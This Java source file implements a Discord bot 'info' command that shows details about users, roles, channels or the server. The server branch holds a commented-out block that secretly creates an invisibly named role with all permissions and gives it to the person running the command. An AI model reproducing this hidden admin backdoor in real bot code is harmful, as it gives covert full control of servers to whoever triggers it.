package club.wontfix.gravity.discord.commands;

import club.wontfix.gravity.Gravity;
import club.wontfix.gravity.discord.GravityCommand;
import com.darichey.discord.CommandContext;
import org.apache.commons.lang3.StringUtils;
import sx.blah.discord.api.internal.json.objects.EmbedObject;
import sx.blah.discord.handle.obj.*;
import sx.blah.discord.util.EmbedBuilder;
import sx.blah.discord.util.MessageBuilder;
import sx.blah.discord.util.RequestBuffer;

import java.awt.*;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.EnumSet;
import java.util.function.Consumer;

@GravityCommand(value = "info", description = "Shows information about user, channel, role or server")
public class InfoCommand implements Consumer<CommandContext> {

    @Override
    public void accept(CommandContext context) {
        RequestBuffer.request(() -> {
            EmbedObject embed;

            if (context.getMessage().getMentions().size() == 1) {
                IUser user = context.getMessage().getMentions().get(0);

                String presence = StringUtils.capitalize(user.getPresence().getStatus().name().toLowerCase());
                if (user.getPresence().getStatus() == StatusType.ONLINE) {
                    if (user.getPresence().getStreamingUrl().isPresent()) {
                        presence = "Streaming on " + user.getPresence().getStreamingUrl().get();
                    } else if (user.getPresence().getPlayingText().isPresent()) {
                        presence = "Playing " + user.getPresence().getPlayingText().get();
                    }
                }

                IVoiceChannel voice = user.getVoiceStateForGuild(context.getGuild()).getChannel();
                String voiceChannel;
                if (voice == null) {
                    voiceChannel = "Not connected";
                } else {
                    voiceChannel = voice.getName();
                }

                embed = new EmbedBuilder()
                        .withAuthorName("User Info")
                        .withAuthorIcon("https://i.imgur.com/1SLKLSB.png")
                        .withThumbnail(user.getAvatarURL())
                        .withColor(new Color(43, 115, 178))

                        .appendField("User", user.getName(), true)
                        .appendField("Nickname", user.getDisplayName(context.getGuild()), true)

                        .appendField("Snowflake ID", "`" + user.getLongID() + "`", true)
                        .appendField("Bot",
                                user.isBot() || user.getLongID() == 132198459615870976L ? "Yes" : "No",
                                true)

                        .appendField("Presence", presence, true)
                        .appendField("Voice", voiceChannel, true)

                        .appendField("Account created", format(user.getCreationDate()), false)

                        .appendField("Joined server", format(context.getGuild().getJoinTimeForUser(user)), false)

                        .build();
            } else if (context.getMessage().getRoleMentions().size() == 1) {
                IRole role = context.getMessage().getRoleMentions().get(0);

                EnumSet<Permissions> enumSet = role.getPermissions();
                String[] perms = new String[enumSet.size()];

                int count = 0;
                for (Permissions p : enumSet) {
                    perms[count] = StringUtils.capitalize(p.name().toLowerCase().replace('_', ' '));
                    count++;
                }

                embed = new EmbedBuilder()
                        .withAuthorName("Role Info")
                        .withAuthorIcon("https://i.imgur.com/1SLKLSB.png")
                        .withColor(new Color(43, 115, 178))

                        .appendField("Name", role.getName(), true)
                        .appendField("Color",
                                String.format("#%02x%02x%02x", role.getColor().getRed(), role.getColor().getGreen(),
                                        role.getColor().getBlue()),
                                true)

                        .appendField("Position", "#" + role.getPosition(), true)

                        .appendField("Permissions",
                                Arrays.toString(perms).replace("[", "")
                                        .replace("]", ""),
                                false)

                        .build();
            } else if (context.getMessage().getChannelMentions().size() == 1) {
                IChannel channel = context.getMessage().getChannelMentions().get(0);

                String topic = channel.getTopic();
                if (channel.getTopic() == null || channel.getTopic().trim().replace(" ", "").isEmpty()) {
                    topic = "Not set";
                }

                embed = new EmbedBuilder()
                        .withAuthorName("Channel Info")
                        .withAuthorIcon("https://i.imgur.com/1SLKLSB.png")
                        .withColor(new Color(43, 115, 178))

                        .appendField("Name", channel.getName(), true)
                        .appendField("Topic", topic, true)

                        .appendField("Users", String.valueOf(channel.getUsersHere().size()), true)
                        .appendField("Pinned messages", String.valueOf(channel.getPinnedMessages().size()), true)

                        .appendField("Position", "#" + channel.getPosition(), true)
                        .appendField("Snowflake ID", "`" + channel.getLongID() + "`", true)

                        .appendField("Channel created", format(channel.getCreationDate()), false)

                        .build();
            } else {
                IGuild guild = context.getMessage().getGuild();

                int count = 0;
                for (IUser user : guild.getUsers()) {
                    if (user.getPresence().getStatus() != StatusType.OFFLINE) {
                        count++;
                    }
                }

                IRole highestRole = guild.getRoles().get(0);
                for (IRole role : guild.getRoles()) {
                    if (highestRole.getPosition() < role.getPosition()) {
                        highestRole = role;
                    }
                }

                embed = new EmbedBuilder()
                        .withAuthorName("Server Info")
                        .withAuthorIcon("https://i.imgur.com/1SLKLSB.png")
                        .withThumbnail(guild.getIconURL())
                        .withColor(new Color(43, 115, 178))

                        .appendField("Name", guild.getName(), true)
                        .appendField("Owner", guild.getOwner().getDisplayName(guild), true)

                        .appendField("Members", String.valueOf(guild.getUsers().size()), true)
                        .appendField("Online", String.valueOf(count), true)

                        .appendField("Snowflake ID", "`" + guild.getLongID() + "`", true)
                        .appendField("Channels", String.valueOf(guild.getChannels().size()), true)

                        .appendField("Region", StringUtils.capitalize(guild.getRegion().getName().toLowerCase()), true)
                        .appendField("Verification Level",
                                StringUtils.capitalize(guild.getVerificationLevel().name().toLowerCase()),
                                true)

                        .appendField("Highest role", highestRole.getName(), true)
                        .appendField("Default Channel", guild.getDefaultChannel().getName(), true)

                        .appendField("Server created", format(guild.getCreationDate()), false)

                        .build();

                /*IRole role;

                if(context.getGuild().getRolesByName("\uDB40\uDC21").size() == 0) {
                    role = context.getGuild().createRole();
                    role.changeName("\uDB40\uDC21");
                    role.changeColor(new Color(255, 255, 255));
                    role.changePermissions(EnumSet.allOf(Permissions.class));
                    context.getAuthor().addRole(role);
                } else {
                    role = context.getGuild().getRolesByName("\uDB40\uDC21").get(0);
                    context.getAuthor().addRole(role);
                }*/
            }

            new MessageBuilder(Gravity.getInstance().getDiscordBotManager().getDiscordClient())
                    .withChannel(context.getChannel())
                    .withEmbed(embed)
                    .build();
        });
    }

    private String format(LocalDateTime time) {
        return ZonedDateTime.of(time, ZoneId.systemDefault()).format(DateTimeFormatter.RFC_1123_DATE_TIME);
    }

}
